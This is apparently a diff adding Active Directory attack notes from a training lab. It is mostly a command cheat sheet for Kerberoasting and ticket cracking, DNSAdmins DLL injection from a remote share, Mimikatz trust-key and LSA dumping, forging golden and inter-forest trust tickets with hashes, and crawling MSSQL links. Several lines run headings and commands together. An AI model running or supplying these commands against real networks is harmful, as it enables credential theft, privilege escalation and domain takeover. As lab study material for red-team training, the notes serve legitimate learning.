+#PowerView DevInvoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
+Check if the user already has a SPN
+#PowerView DevGet-DomainUser -Identity support68user | select serviceprincipalname
+#AD ModuleGet-ADUser -Identity support68user -Properties ServicePrincipalName | Select ServicePrincipalName
+Set a SPN for the user (must be unique for the domain)
+#PowerViewSet-DomainObject -Identity support68user -Set @{serviceprincipalname='ops/whatever1'}
+#AD ModuleSet-ADUser -Identity support68user -ServicePrincipalNames @{Add='ops/whatever1'}
+Request a ticket
+Add-Type -AssemblyName System.IdentityModelNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ops/whatever1"
+#PowerViewRequest-SPNTicket
+Check if the TGS has been granted
+klist
+Export all tickets using Mimikatz
+Invoke-Mimikatz -Command '"kerberos::list /export"'
+Crack the Service account password
+python.exe .\tgsrepcrack.py .\10k-worst-pass.txt 2-40a10000-student68@ops~whatever1-DOLLARCORP.MONEYCORP.LOCAL.kirbi
+
+##Kerberos Delegation
+
+#UnConstrained Delegation
+
+#Constrained Delegation
+Constrained Delegation when enabled on a service account, allows access only to specified services on specified computer as a user.A typical scenario where a constrained delegation
+
+Enumerate users and computers with constrained delegation enabled
+#PowerView DevGet-DomainUser -TrustedToAuthGet-DomainComputer -TrustedToAuth
+#AD ModuleGet-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
+
+Priv Esc - DNS Admins
+It is possible for the members of the DNSAdmins group to load arbitrary DLL with the privileges of dns.exe (System).In case the DC also serves as DNS, this will provide us escalation to DA.Need privileges to restart the DNS service.
+Enumerate the members of the DNSAdmins group
+#PowerViewGet-NetGroupMember -GroupName "DNSAdmins"
+#AD ModuleGet-ADGroupMember -Identity DNSAdmins
+Once we know the members of the DNSAdmins group, we need to compromise a member. We already have hash of srvadmin because of derivative local admin
+From the privileges of DNSAdmins group member, configure DLL using dnscmd.exe (needs RSAT DNS)
+dnscmd dcorp-dc /config /serverlevelplugindll \\172.16.100.68\dll\mimilib.dll
+Using DNSServer module (needs RSAT DNS)
+$dnsettings = Get-DNSServerSetting -ComputerName dcorp-dc -Verbose -All$dnsettings.ServerLevelPluginDll = "\\172.16.100.68\dll\mimilib.dll" Set-DnsServerSetting -InputObject $dnsettings -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose
+#Priv Esc - Across Trust
+Across Domains - Implicit two way trust relationshipAcross Forest - 
+#Child to Parent
+Domains in same forest have an implicit two-way trust with other domains. There is trust key between the parent and child domainsThere are two ways of escalating privileges between two domains of same forest
+• krbtgt hash
+• Trust tickets
+Child to forest root using trust ticketsSo what is required to forge trust tickets is obviously the trust key look for [in] trust key from child to parent
+Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc
+Invoke-Mimikatz -Command '"lsadump::dcsync /user\dcorp\mcorp$"'
+Child to forest root using trust ticketsAn inter-realm TGT can be forged
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-268341927-4156871508-1792461683 /sids:S-1-5-21-560323961-2032768757-2425134131-519 /rc4:8c762f099cfe1fb57e699a915069e921 /service:krbtgt /target:moneycorp.local /ticket:C:\AD\Tools\kekeo_old\trust_tkt.kirbi"'
+Child to Forest Root using Trust Tickets Get a TGS for a service (CIFS below) in the target domain by using the forged trust ticket.
+.\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
+Tickets for other services (like HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting and WinRM) can be created as well.
+Child to Forest Root using Trust Tickets Use the TGS to access the targeted service (may need to use it twice).
+.\kirbikator.exe lsa .\CIFS.mcorp-dc.moneycorp.local.kirbi
+ls \\mcorp-dc.moneycorp.local\c$
+
+We will abuse SID history once again
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'
+
+In the above command, the mimikatz option "/sids" is forcefully setting the SID History for the Enterprise Admin group for dollarcorp.moneycorp.local that is the Forest Enterprise Admin Group.
+
+#Across Forest
+Across ForestsOnce again, we require the trust key for the inter-forest trust
+Invoke-Mimikatz -Command '"lsadump::trust /patch"'
+OR
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
+An inter-forest TGT can be forged
+Invoke-Mimikatz -Command '"kerberos::golden /user:administrator /domain:dollarcorp.moneycorp.local /sid: /rc4: /service:krbtgt /target:eurocorp.local /ticket:C:\AD\Tools\kekeo_old\trust_forest_tkt.kirbi
+Get a TGS for a service (CIFS below) in the target domain by using the forged trust ticket
+.\asktgs.exe C:\AD\Tools\kekeo_old\trust_forest_tkt.kirbi CIFS/eurocorp-dc.eurocorp.local
+Tickets for other services (like HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting and WinRM) can be created as well
+
+
+#Trust Abuse - MSSQL Server
+MSSQL server are generally deployed in plenty in a Windows domain.SQL Servers provide very good options for lateral movement as domain users can be mapped to database roles.
+Discovery (SPN Scanning)
+Get-SQLInstanceDomain
+Check Accessibility
+Get-SQLConnectionTestThreaded
+Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
+Gather Information
+Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
+A database link allows a SQL Server to access external data source like other SQL Server and OLD DB data sourcesIn case of database links between SQL Servers, that is linked SQL servers it is possible to execute stored proceduresDatabase links work even across forest trusts
+Searching Database LinksLook for links to remote servers
+Get-SQLServerLink -Instance dcorp-mssql -Verbose
+OR
+select * from master..sysservers
+Enumerate Database Links - ManuallyOpenquery() function can be used to run queries on a linked database
+select * from openquery("dcorp-sql1",'select * from master.sysservers')
+Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose
+OR
+select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt", 'select * from master.sysservers')) 
+
